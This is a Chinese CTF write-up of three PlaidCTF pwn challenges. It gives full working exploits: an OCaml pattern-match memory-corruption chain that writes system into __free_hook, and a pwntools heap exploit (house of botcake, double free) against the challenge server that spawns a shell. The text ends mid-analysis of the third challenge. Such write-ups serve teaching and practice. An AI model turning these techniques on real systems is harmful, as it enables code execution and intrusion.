> 原文链接: https://www.anquanke.com//post/id/238876 


# PlaidCTF部分pwn分析


                                阅读量   
                                **132144**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01c503003c88be73b8.jpg)](https://p4.ssl.qhimg.com/t01c503003c88be73b8.jpg)



分享一下上周PlaidCTF的几个pwn题。

## Secure OCaml Sandbox

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"></a>题目分析

题目给了一个Ocaml语言的编译执行环境，输入即是一段Ocaml语言写的代码，目标会对其进行编译执行。

但是首先，执行之前会做一些简单的检查以及添加一个沙箱：

```
#!/bin/sh

set -eu

if grep -qe "external" -e "unsafe" /input/exploit.ml; then
    echo "unsafe!"
    exit 1
fi

echo "open! Sos" &gt; user/exploit.ml
cat /input/exploit.ml &gt;&gt; user/exploit.ml
dune exec user/exploit.exe
```
- 首先代码不能包含`external`和`unsafe`，也就是避免了直接通过`external`导入C函数；
- 其次不能包括`unsafe`，从官方文档里得知，诸如`unsafe-string`之类的没有安全边界检查，也就是可以溢出，现在被禁用了；
- 最后，在每个输入前添加”open! Sos\n”，也就是导入Sos模块。
至于这个Sos模块：

```
open struct
  let blocked = `Blocked

  module Blocked = struct
    let blocked = blocked
  end
end

module Fixed_stdlib = struct
  let open_in = blocked
  let open_in_bin = blocked
  let open_in_gen = blocked
  let open_out = blocked
  let open_out_bin = blocked
  let open_out_gen = blocked
  let unsafe_really_input = blocked

  module Fixed_arg = struct
    include Arg

    let read_arg = blocked
    let read_arg0 = blocked
    let write_arg = blocked
    let write_arg0 = blocked
  end

  module Fixed_array = struct
    include Array

    let unsafe_set = blocked
    let unsafe_get = blocked

    module Floatarray = struct
      let unsafe_set = blocked
      let unsafe_get = blocked
    end
  end

  module Fixed_arrayLabels = struct
    include ArrayLabels

    let unsafe_set = blocked
    let unsafe_get = blocked

    module Floatarray = struct
      let unsafe_set = blocked
      let unsafe_get = blocked
    end
  end

  module Fixed_bytes = struct
    include Bytes

    let unsafe_blit = blocked
    let unsafe_blit_string = blocked
    let unsafe_fill = blocked
    let unsafe_get = blocked
    let unsafe_set = blocked
    let unsafe_of_string = blocked
    let unsafe_to_string = blocked
  end

  module Fixed_bytesLabels = struct
    include Bytes

    let unsafe_blit = blocked
    let unsafe_blit_string = blocked
    let unsafe_fill = blocked
    let unsafe_get = blocked
    let unsafe_set = blocked
    let unsafe_of_string = blocked
    let unsafe_to_string = blocked
  end

  module Fixed_char = struct
    include Char

    let unsafe_chr = blocked
  end

  module Fixed_filename = struct
    include Filename

    let open_temp_file = blocked
    let temp_file = blocked
  end

  module Fixed_float = struct
    include Float

    module Array = struct
      include Array

      let unsafe_set = blocked
      let unsafe_get = blocked
    end

    module ArrayLabels = struct
      include ArrayLabels

      let unsafe_set = blocked
      let unsafe_get = blocked
    end
  end

  module Fixed_scanf = struct
    include Scanf

    module Scanning = struct
      include Scanning

      let open_in = blocked
      let open_in_bin = blocked
      let close_in = blocked
      let from_file = blocked
      let from_file_bin = blocked
    end
  end

  module Fixed_string = struct
    include String

    let unsafe_blit = blocked
    let unsafe_fill = blocked
    let unsafe_get = blocked
    let unsafe_set = blocked
  end

  module Fixed_stringLabels = struct
    include StringLabels

    let unsafe_blit = blocked
    let unsafe_fill = blocked
    let unsafe_get = blocked
    let unsafe_set = blocked
  end

  module Fixed_stdLabels = struct
    module Array = Fixed_arrayLabels
    module Bytes = Fixed_bytesLabels
    module List = ListLabels
    module String = Fixed_stringLabels
  end

  module Fixed_uchar = struct
    include Uchar

    let unsafe_of_int = blocked
    let unsafe_to_char = blocked
  end

  module Arg = Fixed_arg
  module Array = Fixed_array
  module ArrayLabels = Fixed_arrayLabels
  module Bigarray = Blocked
  module Bytes = Fixed_bytes
  module BytesLabels = Fixed_bytesLabels
  module Char = Fixed_char
  module Filename = Fixed_filename
  module Float = Fixed_float
  module Marshal = Blocked
  module Obj = Blocked
  module Pervasives = Blocked
  module Printexc = Blocked
  module Scanf = Fixed_scanf
  module Spacetime = Blocked
  module StdLabels = Fixed_stdLabels
  module String = Fixed_string
  module StringLabels = Fixed_stringLabels
  module Sys = Blocked
  module Uchar = Fixed_uchar
end

include Fixed_stdlib
module CamlinternalLazy = Blocked
module CamlinternalMod = Blocked
module CamlinternalOO = Blocked
module Dynlink = Blocked
module Profiling = Blocked
module Raw_spacetime_lib = Blocked
module Stdlib = Fixed_stdlib
module Topdirs = Blocked
module Unix = Blocked
module UnixLabels = Blocked
module Stdlib__arg = Fixed_arg
module Stdlib__array = Fixed_array
module Stdlib__arrayLabels = Fixed_arrayLabels
module Stdlib__bigarray = Blocked
module Stdlib__bytes = Fixed_bytes
module Stdlib__bytesLabels = Fixed_bytesLabels
module Stdlib__char = Fixed_char
module Stdlib__filename = Fixed_filename
module Stdlib__float = Fixed_float
module Stdlib__marshal = Blocked
module Stdlib__obj = Blocked
module Stdlib__pervasives = Blocked
module Stdlib__printexc = Blocked
module Stdlib__scanf = Fixed_scanf
module Stdlib__spacetime = Blocked
module Stdlib__stdLabels = Fixed_stdLabels
module Stdlib__string = Fixed_string
module Stdlib__stringLabels = Fixed_stringLabels
module Stdlib__sys = Blocked
module Stdlib__uchar = Fixed_uchar
```

则是阻断了可以执行shell命令的接口。

### <a class="reference-link" name="%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"></a>解题过程
<li>由于这个题目有两个，第一个是如上加了`open! Sos\n`，这里的预期解法是：
<pre><code class="lang-ocaml"> open! Sos (* add by main **)
 .Fixed_arg;;
 let ic = open_in "/flag";;
 let flag = input_line ic;;
 print_string flag;;
</code></pre>
也就是实际上并没有完全加载Sos，而是只加载了`Sos.Fixed_arg`，因此沙箱失效，仍然可以orw。
</li>
<li>而主要是第二个，其实来自于SECCON 2020 Quals上的mlml，只是在那基础上添加了更为严格的沙箱，把当时比赛上的非预期都屏蔽了。<br>
但是这篇[博客](https://moraprogramming.hateblo.jp/entry/2020/10/14/185946)中，还是提到了预期解在于Ocaml本身的一个[漏洞](https://github.com/ocaml/ocaml/issues/7241)。<br>
同时，还给出了exp，所以比赛的时候就照着改一些偏移就能打通了，接下来具体分析一下是怎么利用的。</li>
### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

首先从这个简单的POC入手：

```
type u = `{`a: bool; mutable b: int option`}`

let f x =
  match x with
    `{` a = false; _ `}` -&gt; 0
  | `{` b = None; _ `}` -&gt; 1
  | _ when (x.b &lt;- None; false) -&gt; 2
  | `{` a = true; b = Some y `}` -&gt; y

let _ = f `{` a = true; b = Some 5`}`
```

这段代码执行会直接`Segmentation fault (core dumped)`，原因在于调用`f `{` a = true; b = Some 5`}``的时候，关注到第三个匹配`_ when (x.b &lt;- None; false) -&gt; 2`，由于这里执行了赋值操作`x.b &lt;- None`（将None赋值给b），但是仍然是永远`false`，所以仍会匹配到第四个``{` a = true; b = Some y `}``。<br>
问题在于，虽然`b`已经被赋值为`None`，由于Ocaml本身的实现问题，匹配的时候仍是采用原来的值，即`Some 5`；但是最后对`y`解引用的时候，实际上是对`None`进行解引用，当然会`Segmentation fault`。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

所以基于这个漏洞，可以实现读引用的地址、类型转换、任意地址写、任意函数执行等的效果，比如exp中：

```
let s = "AAAAAAAAAAAAAAAAAAAAA"
type s = C of int | D of (string )
let leak (x1,x2) s =
  match (x1,x2) with
    (false,_) -&gt; 0
  | (_,`{`contents=D _`}`) -&gt; 1
  | _ when (x2 := D(s); false) -&gt; 2
  | (true, `{`contents=C y`}`) -&gt; y
```

`leak`函数中`x2 := D(s)`实现了以`s`为参数调用`D`的构造函数，并将其赋值给`x2`，最后返回的`y`就是这个`x2`，从而将`s`的地址给泄露出来。<br>
以及：

```
type s2 = G of int | H of (int -&gt; string)
let s = "AAAAAAAAAAAAAAAAAAAAA"
let bye (x1, x2) y =
   match (x1, x2) with
    (false, _) -&gt; "ab"
  | (_, `{`contents=G _`}`) -&gt; "b"
  | _ when (x2 := G y; false) -&gt; "c"
  | (true, `{`contents=H y`}`) -&gt; y 0
```

`bye`中通过`x2 := G y`将`x2`改为传入的参数`y`，最后将`y`中存放的地址作为类似于函数指针进行执行，由于`y`是传入的参数，所以相当于实现了任意地址跳转的功能。

所以通过以上方法，先泄露出程序基址，再从got表中泄露出libc地址，再任意地址写入onegadget，通过`bye`执行即可。<br>
至于为何leak出来的地址要做一些`*2`甚至`+1`的操作，原因尚不明确，但是用IDA分析一下编译出来的`exploit.exe`，可以发现这些地址确实都进行了奇怪的处理，比如写在ocaml程序里的常数，编译出来的结果是`*2`之后的。<br>
不过影响不大，做一下对称的处理就行。

### <a class="reference-link" name="exp"></a>exp

```
open Bytes
open Printf
type t = A of int | B of (bytes)                                
type s = C of int | D of (string )
type t2 = E of int | F of (int ref)
type s2 = G of int | H of (int -&gt; string)
let s = "AAAAAAAAAAAAAAAAAAAAAAAA"
let bye (x1, x2) y =
   match (x1, x2) with
    (false, _) -&gt; "a"
  | (_, `{`contents=G _`}`) -&gt; "b"
  | _ when (x2 := G y; false) -&gt; "c"
  | (true, `{`contents=H y`}`) -&gt; y 1
let rec byebye n x y =
    if n = 0 then bye x y ^ "c" else byebye (n-1) x y ^ "d"
let leak3 (x1,x2) y =
  match (x1,x2) with
    (false, _) -&gt; of_string "a"
  | (_,`{`contents=A _`}`) -&gt; of_string "b"
  | _ when (x2 := A y; false) -&gt; of_string "c"
  | (true, `{`contents=B y`}`) -&gt; y
let leak (x1,x2) s =
  match (x1,x2) with
    (false,_) -&gt; 0
  | (_,`{`contents=D _`}`) -&gt; 1
  | _ when (x2 := D(s); false) -&gt; 2
  | (true, `{`contents=C y`}`) -&gt; y
let leak2 (x1,x2) y =
  match (x1,x2) with
    (false, _) -&gt; ref 0
  | (_,`{`contents=E _`}`) -&gt; ref 1
  | _ when (x2 := E(y); false) -&gt; ref 2
  | (true, `{`contents=F y`}`) -&gt; y
let prog_base = leak (true, ref (C 1)) s * 2 - 0xDBE78 + 1 (* 0xDBE78 is the offset of string s *)
let target = (0xD9FE0 + prog_base) / 2
let r = leak2 (true, ref (F (ref 1))) target
let libc_base = ((!r) land 0xffffffffff) * 2 * 256 - 0x23e00
let free_hook = libc_base + 0x1bd8e8
let system = libc_base + 0x448a3
let _ = printf "0x%x\n" (prog_base)
let _ = printf "0x%x\n" (target)
let _ = printf "0x%x\n" (libc_base)
let r = leak3 (true,ref (B (of_string "c"))) (free_hook / 2)
let () = set r 0 (char_of_int ((system lsr 0) mod 256))
let () = set r 1(char_of_int ((system lsr 8) mod 256))
let () = set r 2(char_of_int ((system lsr 16) mod 256))
let () = set r 3(char_of_int ((system lsr 24) mod 256))
let () = set r 4(char_of_int ((system lsr 32) mod 256))
let () = set r 5(char_of_int ((system lsr 40) mod 256))
let () = set r 6(char_of_int ((system lsr 48) mod 256))
let s = byebye 1 (true, ref(H(string_of_int))) (free_hook/ 2)
```



## plaidflix

算是比赛中最简单的一道题吧，非常常规的菜单题，只不过glibc是2.32的，但是对做题影响不大。

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"></a>题目分析

首先`add_friend`：

```
void add_friend()
`{`
    friend *v0; // rbx
    int i; // [rsp+4h] [rbp-1Ch]
    __int64 size; // [rsp+8h] [rbp-18h]

    for ( i = 0; i &lt;= 7; ++i )
    `{`
        if ( !friend_array[i] )
        `{`
            puts("How long is your friend's name?");
            printf(format);
            size = (int)read_int() + 1LL;
            if ( size &gt; 0x90 )
            `{`
                puts("No one has such a long name. Try again.");
                return;
            `}`
            if ( size &lt;= 0x2F )
                size = 0x30LL;
            friend_array[i] = (__int64)malloc(8uLL);
            v0 = (friend *)friend_array[i];
            v0-&gt;name = (name)malloc(size);
            puts("What's your friend's name?");
            printf(format);
            read_str(*(_QWORD *)friend_array[i], size);
            break;
        `}`
    `}`
    if ( i &gt; 7 )
        puts("That's too many friends!\n");
`}`
```

非常正常的`malloc`操作，没有任何问题。<br>
但是再`manage_movie`这里有一个`share`功能：

```
int share()
`{`
    struct movie *v0; // rax
    int v2; // [rsp+8h] [rbp-8h]
    int v3; // [rsp+Ch] [rbp-4h]

    puts("Which great movie do you want to share?");
    printf(format);
    v2 = read_int();
    puts("Sharing is caring. Who's the lucky one?");
    printf(format);
    v3 = read_int();
    if ( v3 &gt;= 0 &amp;&amp; v3 &lt;= 7 &amp;&amp; (v0 = (struct movie *)friend_array[v3]) != 0LL )
    `{`
        if ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 6 )
        `{`
            v0 = movie_array[v2];
            if ( v0 )
            `{`
                movie_array[v2]-&gt;shared = 1;
                v0 = movie_array[v2];
                v0-&gt;shared_friend = *(_QWORD *)friend_array[v3];
            `}`
        `}`
    `}`
    else
    `{`
        LODWORD(v0) = puts("Nope!");
    `}`
    return (int)v0;
`}`
```

就是把一个`friend`指针存放到`movie`结构体里，而在`delete_friend`的时候：

```
void *delete_friend()
`{`
    void *result; // rax
    __int64 v1; // [rsp+8h] [rbp-8h]

    puts("Who made you angry that you don't want to be friends with them anymore?");
    printf(format);
    result = (void *)(int)read_int();
    v1 = (int)result;
    if ( (int)result &gt;= 0LL &amp;&amp; (int)result &lt;= 7LL )
    `{`
        result = (void *)friend_array[(int)result];
        if ( result )
        `{`
            free(*(void **)friend_array[v1]);
            free((void *)friend_array[v1]);
            result = friend_array;
            friend_array[v1] = 0LL;
        `}`
    `}`
    return result;
`}`
```

只是把`friend_array`对应位置给清空了，但是如果这个指针被存放到`movie`结构中的话，是没有考虑到的。<br>
那么配合`show_movie`功能：

```
int show_movie()
`{`
    struct movie *v0; // rax
    int v2; // [rsp+8h] [rbp-8h]
    int i; // [rsp+Ch] [rbp-4h]

    v2 = 0;
    LODWORD(v0) = puts("Those are your movies:");
    for ( i = 0; i &lt;= 6; ++i )
    `{`
        v0 = movie_array[i];
        if ( v0 )
        `{`
            printf("\n* Title: %s\n* Rating: %ld\n", (const char *)movie_array[i]-&gt;title, movie_array[i]-&gt;stars);
            LODWORD(v0) = movie_array[i]-&gt;shared;
            if ( (_DWORD)v0 )
                LODWORD(v0) = printf("* Shared with: %s", (const char *)movie_array[i]-&gt;shared_friend);// leak
            ++v2;
        `}`
    `}`
    if ( !v2 )
        LODWORD(v0) = puts("You do not have any movies registered!");
    return (int)v0;
`}`
```

它会将结构体里存的`friend`的内容打印出来。<br>
此外，利用的漏洞在于`delete_acount`这里，这里`delete_feedback`：

```
int delete_feedback()
`{`
    _DWORD *v0; // rax
    __int64 v2; // [rsp+8h] [rbp-8h]

    puts("\nWhat feedback do you want to delete?");
    printf(format);
    v2 = (int)read_int();
    if ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 9 &amp;&amp; feedback_array[v2] )
    `{`
        free((void *)feedback_array[v2]);
        v0 = feedback_status;
        feedback_status[v2] = 0;
    `}`
    else
    `{`
        LODWORD(v0) = puts("That feedback does not exist yet!");
    `}`
    return (int)v0;
`}`
```

并没有把`feedback_array`中对应的指针清空，而只是把 `feedback_status`中对应的状态值置0；再加上这里检查的是`if ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 9 &amp;&amp; feedback_array[v2] )`，因此存在double free的机会。<br>
但是`add_feedback`中：

```
void add_feedback()
`{`
    int i; // [rsp+Ch] [rbp-4h]

    for ( i = 0; i &lt;= 9; ++i )
    `{`
        if ( !feedback_status[i] )
        `{`
            feedback_array[i] = malloc(0x100uLL);
            feedback_status[i] = 1;
            puts("\nWhat feedback do you have for us?");
            printf(format);
            read_str(feedback_array[i], 0x100uLL);
            break;
        `}`
    `}`
    if ( i &gt; 9 )
        puts("\nSo much feedback! That's too much work!\n");
`}`
```

注意到这里是固定地`malloc(0x100uLL);`，没法分配任意大小。

此外，还提供了`add_detail`功能：

```
int add_detail()
`{`
    int result; // eax
    void *v1; // [rsp+8h] [rbp-8h]

    if ( entered )
        return puts("\nYou have already entered your contact informaion!");
    v1 = malloc(0x120uLL);
    puts("\nHow can we reach you in case of questions?");
    printf(format);
    result = (unsigned int)read_str((__int64)v1, 0x120uLL);
    entered = 1;
    return result;
`}`
```

这里有一次`malloc(0x120uLL);`的机会，后续利用会用到。

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"></a>利用思路
1. 首先利用上面提到的`add_friend`，`share`，`delete_friend`，`show_movie`将`chunk-&gt;fd`给leak出来，配合一下glibc 2.32中`chunk-&gt;fd = (chunk &gt;&gt; 12) ^ next_chunk`，如果tcache里只有一个chunk，那么`chunk-&gt;fd`就是`chunk &gt;&gt; 12`，从而可以leak出heap地址。
1. 再利用上面同样的方法，leak出`unsorted bin-&gt;fd`，从而拿到libc地址。
1. 最后利用`delete_count`中的double free，由于早在glibc 2.29中就有对tcache double free的检测了，所以这里通过house of botcake的利用方法，将某一个victim chunk首先合并到unsorted bin中去，再free到tcache中去；之后利用`add_detail`从unsorted bin中割出0x130的chunk，从而可以写到该victim chunk的`fd = __free_hook ^ (chunk &gt;&gt; 12)`，分配到`__free_hook`写为`system`即可。
### <a class="reference-link" name="exp"></a>exp

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys, os, re

context(arch='amd64', os='linux', log_level='debug')

_proc = os.path.abspath('./plaidflix')
_libc = os.path.abspath('./libc-2.32.so')
libc = ELF(_libc)
elf = ELF(_proc)

p = remote('plaidflix.pwni.ng', 1337)

# menu
choose_items = `{`
    "add": 0,
    "delete": 1,
    "show": 2,
    "share": 3
`}`

def leave_name(name):
    p.sendlineafter("What is your name?\n&gt; ", name)

def choose(idx):
    p.sendlineafter("&gt; ", str(idx))

def add_movie(title, stars):
    choose(0)
    choose(choose_items['add'])
    p.sendlineafter("\nWhat movie title do you want to add?", title)
    p.sendlineafter("\nHow good is this movie (1-5 stars)?", str(stars))

def add_friend(size, name):
    choose(1)
    choose(choose_items['add'])
    p.sendlineafter("How long is your friend's name?", str(size))
    p.sendlineafter("What's your friend's name?", name)

def leave():
    choose(2)
    p.sendlineafter("\nAre you sure you want to delete you account? (y/N)", "y")

def add_feedback(content):
    choose(choose_items['add'])
    p.sendlineafter("\nWhat feedback do you have for us?", content)

def add_detail(content):
    choose(choose_items['show'])
    p.sendlineafter("\nHow can we reach you in case of questions?", content)

def show_movie(title):
    choose(0)
    choose(choose_items['show'])
    p.recvuntil("Title: " + title)
    p.recvuntil("* Shared with: ")

def show_friend(idx):
    choose(1)
    choose(choose_items['show'])

def delete_movie(idx):
    choose(0)
    choose(choose_items['delete'])
    p.sendlineafter("\nWhat movie do you want to remove?\nI bet it's one you've seen a hundred times already.", str(idx))

def delete_friend(idx):
    choose(1)
    choose(choose_items['delete'])
    p.sendlineafter("Who made you angry that you don't want to be friends with them anymore?", str(idx))

def delete_feedback(idx):
    choose(choose_items['delete'])
    p.sendlineafter("\nWhat feedback do you want to delete?", str(idx))

def share_movie(movie_idx, friend_idx):
    choose(0)
    choose(choose_items['share'])
    p.sendlineafter("Which great movie do you want to share?", str(movie_idx))
    p.sendlineafter("Sharing is caring. Who's the lucky one?", str(friend_idx))

leave_name("N0p")

# leak heap
for i in range(8):
    add_friend(0x87, str(i))

add_movie("AAA", 5)
add_movie("BBB", 5)

share_movie(0, 0)
share_movie(1, 7)
delete_friend(0)
show_movie("AAA")
heap_base = u64(p.recv(5).ljust(8, b"\x00")) &lt;&lt; 12 

# leak libc
for i in range(1, 8):
    delete_friend(i)
add_friend(0x88, "0")
show_movie("BBB")
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x1e3ba0 - 0xE0

# attack
leave()
for i in range(9):
    add_feedback(str(i))
for i in range(2, 9):
    delete_feedback(i)
delete_feedback(0)
delete_feedback(1)
add_feedback("AAA") # chunk 0
delete_feedback(1)

free_hook = libc_base + libc.sym['__free_hook']
add_detail(b"A" * 0x108 + p64(0x111) + p64(free_hook ^ (heap_base &gt;&gt; 12)))

add_feedback("/bin/sh\x00") # chunk 1
add_feedback(p64(libc_base + libc.sym['system']))

delete_feedback(1)

success("libc_base: " + hex(libc_base))
success("heap_base: " + hex(heap_base))

p.interactive()
```



## Liars and Cheats

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"></a>题目分析

首先这题主要是玩一个骰子游戏，赢了之后直接给一个栈溢出的机会做ROP；所以重点在leak和怎么赢游戏上。<br>
分析一下整个游戏的规则和流程：
<li>首先分配一块内存，用于存放骰子6个点数分别对应的个数，后面AI做决策的时候会用到：
<pre><code class="lang-C hljs"> dice_count = malloc(0x18uLL);
 if ( !dice_count )
     return 0xFFFFFFFFLL;
 v4 = step_into_game((__int64)dice_count);
</code></pre>
</li>
<li>再由用户决定玩游戏的人个数：
<pre><code class="lang-C hljs"> // ...
 players = read_int("How many players total (4-10)? ");
 if ( players &lt;= 3 || players &gt; 10 )
   return 0xFFFFFFFFLL;
 self = players - 1;
 ptr = malloc(4LL * players);
 // ...
</code></pre>
人数在4 ~ 10之间，并分配相应的内存，用来后面储存每个player所剩骰子的个数。
</li>
<li>之后打印游戏规则，简单来说就是：
<ul>
1. 玩家轮流猜骰子，方式是报出骰子的点数`x`，以及该点数骰子的个数`y`。
<li>除了第一个玩家必须`bet`之外，其他玩家都有三种选择，即假设上一名玩家报出点数`x`，以及个数`y`：
<ul>
<li>
`bet`：在上一个玩家的基础上，报出的骰子点数`x1`不比`x`小，报出对应点数的骰子个数`y1`也不比`y`小，即`x1 &gt; x &amp;&amp; y1 &gt;= y || x1 &gt;= x &amp;&amp; y1 &gt; y`。</li>
<li>
`liar`：指出上一名玩家说谎，即认为当前所有玩家的骰子中点数为`x`的骰子个数比`y`小。如果判定正确，那么上一名玩家失去一个骰子；如果判定错误，那么当前玩家自己失去一个骰子。</li>
<li>
`spot on`：认为当前所有玩家的骰子中点数为`x`的骰子个数比正好等于`y`。如果判定正确，那么当前玩家额外获得一个骰子；如果判定错误，那么当前玩家自己失去一个骰子。</li>
</ul>
</li>
1. 不断执行上述流程，最后如果所有AI玩家剩下的骰子为0，那么用户玩家胜出；如果用户玩家失去了所有骰子，那么用户玩家失败。
</ul>
</li>
<li>问题在于，AI玩家会提前知晓所有骰子点数对应的个数：
<pre><code class="lang-C hljs"> init_empty(dice_val_cnt);
 for ( present_player = 0; present_player &lt; players; ++present_player )
 `{`
     for ( die_idx = 0; die_idx &lt; dice_left[present_player]; ++die_idx )
     `{`
         val = rand() % 6;
         player[present_player].dices[die_idx] = val;
         increase_by_one(val, dice_val_cnt); // dice_val_cnt[val]++;
     `}`
     while ( die_idx &lt;= 4 )
         player[present_player].dices[die_idx++] = -1;
 `}`
</code></pre>
在轮到AI做决定的时候，会有如下判断逻辑：
<pre><code class="lang-C hljs"> __int64 __fastcall do_judge(_DWORD *dice_val_cnt, int last_idx, unsigned int *dice_face, unsigned int *dice_cnt)
 `{`
     if ( last_idx != self ) // if last player is not user
         goto LABEL_11;
     if ( judge_less(dice_val_cnt, *dice_face, *dice_cnt) ) // dice_val_cnt[dice_face] &lt; dice_cnt
         return 1LL; # liar
     if ( judge_eq(dice_val_cnt, *dice_face, *dice_cnt) ) // dice_val_cnt[dice_face] == dice_cnt
         return 2LL; # spot on
     LABEL_11:
     if ( (unsigned int)ai_judge(dice_val_cnt, (int *)dice_face, (int *)dice_cnt) )
         return 2LL; # spot on
     return 0LL; # continue
 `}`

 __int64 __fastcall ai_judge(_DWORD *dice_val_cnt, int *dice_face, int *dice_cnt)
 `{`
     __int64 result; // rax
     int i; // [rsp+24h] [rbp-Ch]
     int val; // [rsp+28h] [rbp-8h]
     int v7; // [rsp+2Ch] [rbp-4h]
     int cnt; // [rsp+2Ch] [rbp-4h]

     val = *dice_face;
     v7 = *dice_cnt + 1;
     if ( judge_less(dice_val_cnt, *dice_face, v7) )// dice_val_cnt[dice_face] &lt; v7
     `{`
         cnt = v7 - 1;
         for ( i = val + 1; i &lt;= 5 &amp;&amp; judge_less(dice_val_cnt, i, cnt); ++i )
         ;
         if ( i &lt;= 5 )
         `{`
             *dice_face = i;
             *dice_cnt = cnt;
             result = 0LL;
         `}`
         else
         `{`
             result = 0xFFFFFFFFLL;
         `}`
     `}`
     else
     `{`
         *dice_face = val;
         *dice_cnt = v7;
         result = 0LL;
     `}`
     return result;
 `}`
</code></pre>
简单来说，就是首先判断上一个玩家是不是用户玩家：
<ul>
1. 若是，则判断用户玩家的猜测是否是正确的，即如果骰子个数猜多了，AI就会报`liar`；如果个数正好合适，AI就会报`spot on`；如果没有问题，就会当作上一个玩家也是AI做同样的决定。
1. 若不是，则首先判断如果报出的点数和个数分别为`x`，`y + 1`是否正确；若正确则返回，并选择报出`x`，`y + 1`；若不正确，则增大`x`搜索，搜到则返回，没搜到则说明上一个AI报出的`y`正好等于点数为`x`的骰子的个数，于是后面会报出`spot on`。
</ul>
</li>
<li>根据上面的描述，似乎AI不可能输，但是注意到记录每个玩家的骰子点数的数组在栈上：
<pre><code class="lang-C hljs"> struct player_dice player[10]; // [rsp+50h] [rbp-2E0h] BYREF
</code></pre>
且在后面判断的时候并不是根据AI预先知道的`dice_val_cnt`进行判断的，而是又做了一次重新的统计：
<pre><code class="lang-C hljs"> __int64 __fastcall count_face_cnt(_DWORD *dice, int val)
 `{`
     unsigned int cnt; // [rsp+14h] [rbp-8h]
     int i; // [rsp+18h] [rbp-4h]

     cnt = 0;
     for ( i = 0; i &lt; 5 * players; ++i )
     `{`
         if ( val == dice[i] )
             ++cnt;
     `}`
     return cnt;
 `}`
</code></pre>
</li>
<li>此外，我们上面提到，如果`spot on`正确，是会额外添加骰子的，那么考虑到两种情况：
<ul>
<li>假设共有五个玩家，除了玩家0有6个骰子，其他玩家都有5个骰子，那么其存放在栈上的记录会为：
<pre><code class="hljs ruby">                            (A5)
  +----+----+----+----+----+----+----+----+----+----+----+ ...... +----+----+----+
  | A0 | A1 | A2 | A3 | A4 | B0 | B1 | B2 | B3 | B4 | B5 | ...... | E2 | E3 | E4 |
  +----+----+----+----+----+----+----+----+----+----+----+ ...... +----+----+----+
                              |
                              V
                      B0 will overlap A5
</code></pre>
也就是说，因为`dice_val_cnt`是一边生成骰子点数一边统计个数的，但是后面`count_face_cnt`又是重新遍历数组的，所以这里存在一个不一致，也就是说AI的信息是错的。
</li>
<li>假设共有五个玩家，除了玩家0有6个骰子，其他玩家都有5个骰子，那么其存放在栈上的记录会为：
<pre><code class="hljs ruby">  +----+----+----+----+----+----+----+----+----+----+----+ ...... +----+----+----+----+
  | A0 | A1 | A2 | A3 | A4 | B0 | B1 | B2 | B3 | B4 | B5 | ...... | E2 | E3 | E4 | E5 |
  +----+----+----+----+----+----+----+----+----+----+----+ ...... +----+----+----+----+
                                                                                    |
                                                                                    V
                                                                                 overflow
</code></pre>
同样的`count_face_cnt`计算的是`player * 5`个骰子，`E5`这里溢出了这个范围，所以不会被统计到，AI的信息同样是错的。
</li>
</ul>
</li>
1. 同时，玩家可以通过一种策略获得一个额外的骰子：根据上面提到的AI的策略，由于AI的行为是可预测的，所以完全可能控制用户玩家前一个AI报出的`x`，`y`正好符合点数为`x`的骰子个数有`y`个，这样我们再`spot on`，就可以获得一个额外点数。而完成这个操作的关键在于，我们需要提前知道骰子各个点数对应的个数。
<li>所以最关键的漏洞在于，正式开始游戏之前，用户玩家拥有一个菜单选项：
<pre><code class="lang-C hljs"> v20 = read_int(
     "0) Roll to start round\n"
     "1) Check player's number of dice\n"
     "2) Change your spot\n"
     "3) Number of players left\n"
     "4) Leave\n");
 if ( !v20 )
     break;
 switch ( v20 )
 `{`
     case 1:
         left = get_dice_left(dice_left);
         printf("They have %d dice\n", left);
         --v17;
         break;
     case 2:
         val = read_int("Which player do you want to switch with? ");
         if ( val != self &amp;&amp; val &gt;= 0 &amp;&amp; val &lt; players )
         `{`
         swap_spot(dice_left, self, val);
         self = val;
         `}`
         printf("You are now Player %d\n", (unsigned int)self);
         break;
     case 3:
         v3 = count_players(player);
         printf("There are %d players left\n", v3);
         break;
     case 4:
         return __readfsqword(0x28u) ^ v24;
     default:
         puts("Sorry, didn't catch that");
         break;
 `}`
</code></pre>
其中获取其他玩家的骰子个数信息的实现中：
<pre><code class="lang-C hljs"> __int64 __fastcall get_dice_left(_DWORD *a1)
 `{`
     __int64 result; // rax
     __int64 v2; // [rsp+18h] [rbp-8h]

     v2 = read_int("Player? ");
     if ( v2 &lt;= players )
         result = (unsigned int)a1[v2];
     else
         result = 0xFFFFFFFFLL;
     return result;
 `}`
</code></pre>
<p>`v2`是个符号整数，所以存在一个负整数溢出的情况，也就是说，我们可以通过这个实现一个任意地址读的效果；再加上存放骰子点数对应个数的数组是在堆上的，所以完全可以leak出来。<br>
但是注意到这个功能调用的次数等于总玩家的个数，所以为了能够得到所有点数的个数信息，同时为了获胜更快一点，这里选择5个玩家即可。</p>
</li>- 若是，则判断用户玩家的猜测是否是正确的，即如果骰子个数猜多了，AI就会报`liar`；如果个数正好合适，AI就会报`spot on`；如果没有问题，就会当作上一个玩家也是AI做同样的决定。
